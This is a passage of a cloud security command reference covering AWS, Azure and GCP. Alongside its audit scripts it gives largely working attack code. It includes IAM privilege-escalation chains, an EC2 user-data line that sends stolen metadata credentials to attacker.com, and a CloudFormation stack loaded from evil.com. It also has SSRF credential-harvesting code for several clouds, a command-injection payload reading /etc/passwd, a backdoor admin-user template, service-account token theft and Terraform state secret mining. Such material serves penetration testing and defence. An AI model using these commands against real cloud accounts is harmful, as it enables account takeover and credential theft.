  --query 'Reservations[*].Instances[?PublicIpAddress!=`null`].[InstanceId,PublicIpAddress,State.Name]' \
  --output table
```

### EBS Snapshot Security

```bash
# Check for public EBS snapshots that may contain sensitive data
aws ec2 describe-snapshots --owner-ids self --query '
  Snapshots[*].[SnapshotId,VolumeId,State,StartTime,Description]' --output table

# Find snapshots shared with other accounts
for snap in $(aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[*].SnapshotId' --output text); do
  attrs=$(aws ec2 describe-snapshot-attribute --snapshot-id "$snap" --attribute createVolumePermission 2>/dev/null)
  public=$(echo "$attrs" | jq -r '.CreateVolumePermissions[] | select(.Group=="all")')
  if [ -n "$public" ]; then
    echo "[!] PUBLIC SNAPSHOT: $snap"
  fi
done
```

---

## 19. Azure Storage Security Review

### Storage Account Access Audit

```bash
# List all storage accounts and check public access settings
az storage account list --query '[].{
  Name:name,
  ResourceGroup:resourceGroup,
  HTTPS:enableHttpsTrafficOnly,
  MinTLS:minimumTlsVersion,
  PublicAccess:allowBlobPublicAccess
}' -o table

# Check for publicly accessible containers in each storage account
for acct in $(az storage account list --query '[].name' -o tsv); do
  KEY=$(az storage account keys list --account-name "$acct" --query '[0].value' -o tsv)
  for container in $(az storage container list --account-name "$acct" --account-key "$KEY" --query '[].name' -o tsv 2>/dev/null); do
    PERM=$(az storage container show --name "$container" --account-name "$acct" --account-key "$KEY" --query 'publicAccess' -o tsv 2>/dev/null)
    if [ "$PERM" != "None" ] && [ -n "$PERM" ]; then
      echo "[!] PUBLIC CONTAINER: $acct/$container ($PERM)"
    fi
  done
done
```

---

## 20. GCP Compute Security

### Firewall Rule Audit

```bash
# List all GCP firewall rules with their source ranges
gcloud compute firewall-rules list --format="table(
  name,
  network,
  direction,
  sourceRanges.list():label=SRC_RANGES,
  allowed[].map().firewall_rule().list():label=ALLOW,
  denied[].map().firewall_rule().list():label=DENY
)"

# Find rules allowing 0.0.0.0/0 ingress
gcloud compute firewall-rules list --format=json | \
  jq -r '.[] | select(.direction=="INGRESS") | select(.sourceRanges[] | contains("0.0.0.0/0")) | "\(.name) | \(.allowed)"'
```

### GCP Service Account Key Age Check

```bash
# Audit service account keys for age (should be rotated regularly)
for sa in $(gcloud iam service-accounts list --format="value(email)"); do
  gcloud iam service-accounts keys list --iam-account="$sa" \
    --format="table(keyType,validAfterTime,validBeforeTime)" 2>/dev/null
done

# Find keys older than 90 days (rotation overdue)
gcloud iam service-accounts list --format="value(email)" | while read sa; do
  gcloud iam service-accounts keys list --iam-account="$sa" --format=json 2>/dev/null | \
    jq -r --arg cutoff "$(date -d '90 days ago' +%Y-%m-%dT%H:%M:%SZ)" \
    '.[] | select(.validAfterTime < $cutoff and .keyType=="USER_MANAGED") | "\(.name) created \(.validAfterTime)"'
done
```

---

## 21. AWS Lambda Security Assessment

### Lambda Function Security Review

```bash
# Enumerate Lambda functions and check for exposed environment variables
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  for func in $(aws lambda list-functions --region "$region" --query 'Functions[*].FunctionName' --output text 2>/dev/null); do
    env_vars=$(aws lambda get-function-configuration --function-name "$func" --region "$region" --query 'Environment.Variables' --output json 2>/dev/null)
    if [ "$env_vars" != "null" ] && [ -n "$env_vars" ]; then
      echo "[!] $func ($region) has environment variables:"
      echo "$env_vars" | jq -r 'to_entries[] | "  \(.key): \(.value)"' 2>/dev/null
    fi
  done
done
```

### Lambda Execution Role Analysis

```bash
# Check Lambda execution roles for overly permissive policies
for func in $(aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output text); do
  fname=$(echo "$func" | awk '{print $1}')
  role_arn=$(echo "$func" | awk '{print $2}')
  role_name=$(echo "$role_arn" | awk -F'/' '{print $NF}')
  
  # Check attached policies
  aws iam list-attached-role-policies --role-name "$role_name" --query 'AttachedPolicies[*].PolicyArn' --output text 2>/dev/null | \
    grep -q "AdministratorAccess" && echo "[!] $fname role has AdministratorAccess!"
  
  # Check inline policies for wildcard actions
  for policy in $(aws iam list-role-policies --role-name "$role_name" --query 'PolicyNames' --output text 2>/dev/null); do
    aws iam get-role-policy --role-name "$role_name" --policy-name "$policy" --output json 2>/dev/null | \
      jq -r '.PolicyDocument.Statement[] | select(.Effect=="Allow" and (.Action | test("\\*"))) | "[WILDCARD] '"$fname"': '"$policy"'"' 2>/dev/null
  done
done
```

---

## 22. Multi-Cloud Security Dashboard

### Cross-Cloud Security Summary

```bash
#!/bin/bash
# Generate cross-cloud security posture summary
echo "=== Cloud Security Posture Summary ==="
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo ""

echo "--- AWS ---"
AWS_USERS=$(aws iam list-users --query 'length(Users)' --output text)
AWS_MFA=$(aws iam list-users --query 'Users[*].UserName' --output text | \
  while read user; do aws iam list-mfa-devices --user-name "$user" --query 'length(MFADevices)'; done | grep -c "^0" || echo 0)
echo "Users: $AWS_USERS | Without MFA: $AWS_MFA"
echo "Public S3: $(aws s3api list-buckets --query 'length(Buckets)' --output text) buckets total"

echo "--- Azure ---"
az account list --query '[].{Name:name,State:state}' -o table 2>/dev/null
echo "Storage Accounts: $(az storage account list --query 'length([])' -o tsv 2>/dev/null)"

echo "--- GCP ---"
echo "Projects: $(gcloud projects list --format='value(projectId)' 2>/dev/null | wc -l)"
echo "Service Accounts: $(gcloud iam service-accounts list --format='value(email)' 2>/dev/null | wc -l)"
```

---

## 23. AWS IAM Privilege Escalation Chains

### Chained Privilege Escalation via Lambda

```bash
# Step 1: Assume role with lambda:CreateFunction permission
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/LambdaCreator --role-session-name chain1

# Step 2: Create a Lambda with a role that has higher privileges
aws lambda create-function \
  --function-name privesc-helper \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://function.zip

# Step 3: Invoke the Lambda to execute code as AdminRole
aws lambda invoke --function-name privesc-helper /tmp/output.txt
cat /tmp/output.txt
```

### EC2-Based Privilege Escalation

```bash
# Launch EC2 with an admin instance profile (requires iam:PassRole + ec2:RunInstances)
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminInstanceProfile \
  --user-data '#!/bin/bash
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole > /tmp/creds
  curl -X POST https://attacker.com/exfil -d @/tmp/creds'

# Check for over-permissive instance profiles
for profile in $(aws iam list-instance-profiles --query 'InstanceProfiles[*].InstanceProfileName' --output text); do
  role=$(aws iam get-instance-profile --instance-profile-name "$profile" --query 'InstanceProfile.Roles[0].RoleName' --output text 2>/dev/null)
  policies=$(aws iam list-attached-role-policies --role-name "$role" --query 'AttachedPolicies[*].PolicyArn' --output text 2>/dev/null)
  echo "$profile -> $role -> $policies"
  echo "$policies" | grep -q "AdministratorAccess" && echo "  [!] ADMIN ACCESS VIA $profile"
done
```

### CloudFormation Privilege Escalation

```bash
# Deploy a CloudFormation stack with an admin role (requires cloudformation:CreateStack + iam:PassRole)
aws cloudformation create-stack \
  --stack-name privesc-stack \
  --template-url https://evil.com/malicious-template.yaml \
  --role-arn arn:aws:iam::123456789012:role/CloudFormationAdminRole \
  --capabilities CAPABILITY_IAM

# List all stacks with their service roles
aws cloudformation describe-stacks --query 'Stacks[*].[StackName,RoleARN]' --output table
```

---

## 24. GCP Service Account Exploitation Chains

### Compute-to-Service-Account Chain

```bash
# From a compromised GCE instance, escalate through service account impersonation
# Step 1: Get default service account token
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r '.access_token')

# Step 2: List all service accounts
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://iam.googleapis.com/v1/projects/my-project/serviceAccounts" | jq '.accounts[].email'

# Step 3: Try impersonation to higher-privileged SA
curl -s -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/admin-sa@my-project.iam.gserviceaccount.com:generateAccessToken" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' | jq '.accessToken'
```

### GCP Organization-Level Enumeration

```bash
# Enumerate organization policies and IAM bindings at org level
gcloud organizations list --format="table(displayName,name,lifecycleState)"
ORG_ID=$(gcloud organizations list --format="value(name)" | head -1)

# Get org-level IAM policy (most privileged bindings)
gcloud organizations get-iam-policy "$ORG_ID" --format=json | \
  jq '.bindings[] | select(.role | test("owner|admin|editor")) | {role, members}'

# Enumerate all projects and their IAM policies
for proj in $(gcloud projects list --format="value(projectId)"); do
  echo "=== $proj ==="
  gcloud projects get-iam-policy "$proj" --format=json 2>/dev/null | \
    jq -r '.bindings[] | select(.role | test("owner|editor|admin")) | "\(.role): \(.members | join(", "))"'
done
```

---

## 25. Azure AD Advanced Attacks

### Conditional Access Bypass

```bash
# Enumerate conditional access policies (requires GlobalReader or PrivilegedRoleAdmin)
az rest --method GET --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  --headers "Authorization=Bearer $TOKEN" | jq '.value[] | {id, displayName, state, conditions}'

# Check for excluded apps and users (bypass candidates)
az rest --method GET --uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  --headers "Authorization=Bearer $TOKEN" | \
  jq '.value[] | select(.state == "enabled") | {name: .displayName, excludedApps: .conditions.applications.excludeApplications, excludedUsers: .conditions.users.excludeUsers}'

# Test authentication from different locations (Azure Cloud Shell bypasses some CA)
az rest --method GET --uri "https://graph.microsoft.com/v1.0/me" \
  --headers "Authorization=Bearer $TOKEN"
```

### Application and Service Principal Abuse

```bash
# Create a new application with dangerous permissions (requires Application.ReadWrite.All)
az ad app create --display-name "legit-app" \
  --required-resource-accesses '[{"resourceAppId":"00000003-0000-0000-c000-000000000000","resourceAccess":[{"id":"df021288-bdef-4463-a889-35723a6c2774","type":"Role"}]}]'

# List all apps with certificate credentials (potential for credential theft)
az ad app list --query "[?keyCredentials].{Name:displayName,KeyId:keyCredentials[0].keyId,Start:keyCredentials[0].startDateTime}" -o table

# Find apps with long-lived client secrets
az ad app list --query "[?passwordCredentials].{Name:displayName,End:passwordCredentials[0].endDateTime}" -o table | \
  awk -F'|' '{print}' | grep "2027\|2028\|2029"
```

---

## 26. Serverless Injection Attacks

### AWS Lambda Event Injection

```python
# Craft malicious Lambda event payloads for testing injection vulnerabilities
import json

# SSRF via Lambda event payload
ssrf_payload = {
    "body": json.dumps({
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    }),
    "httpMethod": "POST",
    "headers": {"Content-Type": "application/json"}
}

# Command injection via Lambda parameter
cmdi_payload = {
    "filename": "test; cat /etc/passwd",
    "action": "read"
}

# Deserialization attack
deser_payload = {
    "data": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",
    "format": "java-serialized"
}

# Lambda layer import hijacking detection
layer_check = """
import boto3
client = boto3.client('lambda')
for func in client.list_functions()['Functions']:
    layers = func.get('Layers', [])
    for layer in layers:
        info = client.get_layer_version_by_arn(arn=layer['Arn'])
        print(f"[LAYER] {func['FunctionName']}: {layer['Arn']} -> {info.get('Content', {}).get('Location', 'N/A')}")
"""
print(ssrf_payload)
```

### Azure Functions Key Extraction

```bash
# Enumerate Azure Function App keys (requires access)
FUNCTION_APP="target-function-app"

# Get master key via ARM template
az resource list --resource-type Microsoft.Web/sites --query "[?kind=='functionapp'].{Name:name,Group:resourceGroup}" -o table

# List function keys
az rest --method POST \
  --uri "https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Web/sites/$FUNCTION_APP/host/default/listKeys?api-version=2018-11-01" \
  --query 'masterKey' -o tsv

# Test function with extracted key
curl "https://$FUNCTION_APP.azurewebsites.net/api/HttpTrigger?code=EXTRACTED_MASTER_KEY" \
  -H "Content-Type: application/json" -d '{"input": "test"}'
```

---

## 27. Cloud Metadata Chained Attacks

### SSRF-to-Cloud-Takeover Chain

```python
# Automated SSRF-to-cloud credential extraction and resource enumeration
import requests
import json

METADATA_ENDPOINTS = {
    'aws': {
        'base': 'http://169.254.169.254/latest/',
        'token': None,
        'creds_path': 'meta-data/iam/security-credentials/',
        'user_data': 'user-data',
        'headers': {}
    },
    'azure': {
        'base': 'http://169.254.169.254/metadata/',
        'creds_path': 'identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        'headers': {'Metadata': 'true'}
    },
    'gcp': {
        'base': 'http://169.254.169.254/computeMetadata/v1/',
        'creds_path': 'instance/service-accounts/default/token',
        'headers': {'Metadata-Flavor': 'Google'}
    }
}

def probe_metadata(ssrf_url, target_path=None):
    """Probe cloud metadata service via SSRF vulnerability."""
    results = {}
    for cloud, config in METADATA_ENDPOINTS.items():
        try:
            url = ssrf_url + config['base']
            if target_path:
                url += target_path
            elif cloud == 'aws':
                # Get IMDSv2 token first
                token_resp = requests.put(
                    ssrf_url + 'http://169.254.169.254/latest/api/token',
                    headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'},
                    timeout=5
                )
                if token_resp.ok:
                    config['headers']['X-aws-ec2-metadata-token'] = token_resp.text

            resp = requests.get(url, headers=config.get('headers', {}), timeout=5)
            if resp.ok:
                results[cloud] = resp.text[:500]
                print(f"[+] {cloud.upper()} metadata accessible via SSRF")
        except Exception:
            pass
    return results

# Example: probe via an open redirect or SSRF endpoint
# findings = probe_metadata("http://vulnerable-app.local/fetch?url=")
```

### Alibaba Cloud and Oracle Cloud Metadata

```bash
# Alibaba Cloud (ECS) metadata retrieval
curl --connect-timeout 5 "http://100.100.100.200/latest/meta-data/"
curl --connect-timeout 5 "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
curl --connect-timeout 5 "http://100.100.100.200/latest/user-data"

# Oracle Cloud (OCI) instance metadata
curl --connect-timeout 5 -H "Authorization: Bearer Oracle" \
  "http://169.254.169.254/opc/v1/instance/"
curl --connect-timeout 5 -H "Authorization: Bearer Oracle" \
  "http://169.254.169.254/opc/v1/instance/metadata/"
curl --connect-timeout 5 -H "Authorization: Bearer Oracle" \
  "http://169.254.169.254/opc/v2/instance/"

# DigitalOcean metadata
curl --connect-timeout 5 "http://169.254.169.254/metadata/v1.json"
curl --connect-timeout 5 "http://169.254.169.254/metadata/v1/")

# Cloudflare Workers (if SSRF reaches workers)
curl "http://169.254.169.254/cdn-cgi/trace"
```

---

## 28. AWS Lambda Privilege Escalation

### Lambda-Based Role Assumption

```bash
# Enumerate Lambda functions with over-permissive execution roles
for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  role_arn=$(aws lambda get-function-configuration --function-name "$func" --query 'Role' --output text 2>/dev/null)
  role_name=$(echo "$role_arn" | awk -F'/' '{print $NF}')
  admin_check=$(aws iam list-attached-role-policies --role-name "$role_name" --query 'AttachedPolicies[?contains(PolicyArn, `AdministratorAccess`)].PolicyArn' --output text 2>/dev/null)
  if [ -n "$admin_check" ]; then
    echo "[!] $func has Admin role: $role_arn"
  fi
done

# Exploit Lambda function to steal role credentials
aws lambda invoke --function-name target-function --payload '{"command": "env"}' /tmp/lambda_output.txt
cat /tmp/lambda_output.txt | jq '.environmentVariables'
```

### Lambda Environment Variable Secret Extraction

```bash
# Extract secrets from Lambda environment variables across all regions
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  aws lambda list-functions --region "$region" --query 'Functions[*].[FunctionName,Environment.Variables]' --output json 2>/dev/null | \
    jq -r '.[] | select(.[1] != null) | "\.[0]: \(.[1] | keys | join(","))"' 2>/dev/null
done

# Update Lambda function to exfiltrate credentials via outbound call
aws lambda update-function-code --function-name target-function \
  --zip-file fileb://malicious_lambda.zip --publish
```

---

## 29. Azure Conditional Access Bypass

### CA Policy Enumeration and Gap Analysis

```bash
# List all conditional access policies and identify exclusions
TOKEN=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)

# Enumerate all CA policies with their conditions
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" | \
  jq '.value[] | {name: .displayName, state: .state, apps: .conditions.applications.includeApplications, excluded: .conditions.users.excludeUsers}'

# Find policies with excluded users or apps (bypass candidates)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" | \
  jq -r '.value[] | select(.state == "enabled") | select(.conditions.users.excludeUsers != null or .conditions.applications.excludeApplications != null) | "\(.displayName): excluded_users=\(.conditions.users.excludeUsers // []), excluded_apps=\(.conditions.applications.excludeApplications // [])"'
```

### Legacy Authentication Bypass

```bash
# Test if legacy authentication protocols bypass CA (basic auth)
# SMTP/IMAP/POP3 auth test via curl
curl -s -X POST "https://outlook.office365.com/api/v2.0/me/messages" \
  -u "user@tenant.onmicrosoft.com:password" \
  -H "Content-Type: application/json" 2>&1 | head -5

# Exchange Online legacy auth check
curl -s "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml" \
  -u "user@tenant.onmicrosoft.com:password" \
  -H "Content-Type: text/xml" -d '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>user@tenant.onmicrosoft.com</EMailAddress></Request></Autodiscover>'
```

---

## 30. GCP Service Account Key Extraction

### Service Account Key Creation and Extraction

```bash
# List all service accounts with their roles
gcloud iam service-accounts list --format="table(email,displayName)"

# Check which SA keys exist and identify user-managed keys
for sa in $(gcloud iam service-accounts list --format="value(email)"); do
  key_count=$(gcloud iam service-accounts keys list --iam-account="$sa" --format="value(keyType)" 2>/dev/null | grep -c "USER_MANAGED" || echo 0)
  if [ "$key_count" -gt 0 ]; then
    echo "[!] $sa has $key_count user-managed keys"
    gcloud iam service-accounts keys list --iam-account="$sa" --format="table(keyType,validAfterTime,validBeforeTime)"
  fi
done

# Create new key if iam.serviceAccountKeys.create permission exists
gcloud iam service-accounts keys create /tmp/sa_key.json \
  --iam-account=target-sa@project.iam.gserviceaccount.com

# Authenticate with extracted key
gcloud auth activate-service-account --key-file=/tmp/sa_key.json
gcloud config set project target-project
gcloud iam service-accounts list
```

### GCP Compute Instance Key Exfiltration

```python
# Extract GCP service account credentials from a compromised instance
import requests
import json
import subprocess

def extract_gcp_sa_token():
    """Extract service account token from GCP metadata service."""
    try:
        token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        headers = {"Metadata-Flavor": "Google"}
        resp = requests.get(token_url, headers=headers, timeout=5)
        if resp.ok:
            token_data = resp.json()
            print(f"[+] Token expires: {token_data.get('expires_in')}s")
            return token_data["access_token"]
    except Exception:
        pass
    return None

def list_sa_keys(project_id, token):
    """List service account keys using stolen token."""
    url = f"https://iam.googleapis.com/v1/projects/{project_id}/serviceAccounts"
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.get(url, headers=headers)
    accounts = resp.json().get("accounts", [])
    for sa in accounts:
        email = sa["email"]
        print(f"[*] Service Account: {email}")
    return accounts

token = extract_gcp_sa_token()
if token:
    print(f"[+] Extracted token: {token[:20]}...")
```

---

## 31. CloudFormation Template Injection

### Malicious CloudFormation Stack Deployment

```bash
# Deploy a CloudFormation stack that creates an admin user
cat > /tmp/malicious-template.yaml << 'TEMPLATE'
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  AdminUser:
    Type: AWS::IAM::User
    Properties:
      UserName: cf-backdoor-user
      LoginProfile:
        Password: TempPassword123!
  AdminPolicy:
    Type: AWS::IAM::UserPolicy
    Properties:
      UserName: !Ref AdminUser
      PolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Action: '*'
            Resource: '*'
  AdminAccessKey:
    Type: AWS::IAM::AccessKey
    Properties:
      UserName: !Ref AdminUser
Outputs:
  AccessKeyId:
    Value: !Ref AdminAccessKey
  SecretAccessKey:
    Value: !GetAtt AdminAccessKey.SecretAccessKey
TEMPLATE

# Deploy the malicious stack (requires cloudformation:CreateStack + iam:PassRole)
aws cloudformation create-stack \
  --stack-name legit-infrastructure \
  --template-body file:///tmp/malicious-template.yaml \
  --capabilities CAPABILITY_IAM CAPABILITY_NAMED_IAM \
  --region us-east-1

# Wait for stack completion and extract outputs
aws cloudformation wait stack-create-complete --stack-name legit-infrastructure
aws cloudformation describe-stacks --stack-name legit-infrastructure \
  --query 'Stacks[0].Outputs' --output table
```

### CloudFormation Import Attacks

```bash
# Enumerate existing CloudFormation stacks for privilege escalation opportunities
aws cloudformation describe-stacks --query 'Stacks[*].[StackName,StackStatus,RoleARN]' --output table

# Detect stacks with over-permissive IAM roles
for stack in $(aws cloudformation describe-stacks --query 'Stacks[*].StackName' --output text); do
  role_arn=$(aws cloudformation describe-stacks --stack-name "$stack" --query 'Stacks[0].RoleARN' --output text 2>/dev/null)
  if [ "$role_arn" != "None" ] && [ -n "$role_arn" ]; then
    role_name=$(echo "$role_arn" | awk -F'/' '{print $NF}')
    echo "[!] Stack $stack uses role: $role_arn"
    aws iam list-attached-role-policies --role-name "$role_name" --query 'AttachedPolicies[*].PolicyArn' --output text
  fi
done
```

---

## 32. Terraform State File Exploitation

### Remote State File Discovery and Extraction

```bash
# Enumerate S3 buckets that may contain Terraform state files
for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  # Common Terraform state file patterns
  for prefix in "terraform" "tfstate" "infra" "deploy" "state"; do
    aws s3 ls "s3://${bucket}/${prefix}/" --no-sign-request 2>/dev/null | grep -i "tfstate" && \
      echo "[!] Found Terraform state in bucket: $bucket/$prefix/"
  done
done

# Download Terraform state file (contains secrets, resource IDs, configuration)
aws s3 cp s3://target-infra-bucket/terraform.tfstate /tmp/tfstate.json --no-sign-request

# Extract secrets from Terraform state
cat /tmp/tfstate.json | jq -r '.. | .secret? // .password? // .api_key? // .token? // empty' 2>/dev/null | sort -u

# Parse state for sensitive outputs and variables
cat /tmp/tfstate.json | jq -r '.outputs | to_entries[] | select(.value.value | type == "string") | "\(.key): \(.value.value)"' 2>/dev/null
```

### Terraform State Secret Mining

```python
# Automated extraction of secrets from Terraform state files
import json
import re
import sys

SECRET_PATTERNS = [
    r'(?i)(password|secret|token|api_key|access_key|private_key)',
    r'AKIA[0-9A-Z]{16}',
    r'ghp_[a-zA-Z0-9]{36}',
    r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
    r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
]

def mine_tfstate(state_file):
    """Extract all secrets from a Terraform state file."""
    with open(state_file) as f:
        state = json.load(f)

    secrets_found = []

    # Check outputs
    for key, output in state.get('outputs', {}).items():
        value = str(output.get('value', ''))
        for pattern in SECRET_PATTERNS:
            if re.search(pattern, value):
                secrets_found.append({'location': f'output.{key}', 'pattern': pattern, 'value': value[:80]})

    # Check resources
    for resource in state.get('resources', []):
        for attr_key, attr_val in resource.get('instances', [{}])[0].get('attributes', {}).items():
            val_str = str(attr_val)
            for pattern in SECRET_PATTERNS:
                if re.search(pattern, val_str):
                    secrets_found.append({'location': f'resource.{resource["type"]}.{attr_key}', 'pattern': pattern, 'value': val_str[:80]})

    for s in secrets_found:
        print(f"[SECRET] {s['location']}: matches {s['pattern']} -> {s['value']}")
    return secrets_found

if len(sys.argv) > 1:
    mine_tfstate(sys.argv[1])
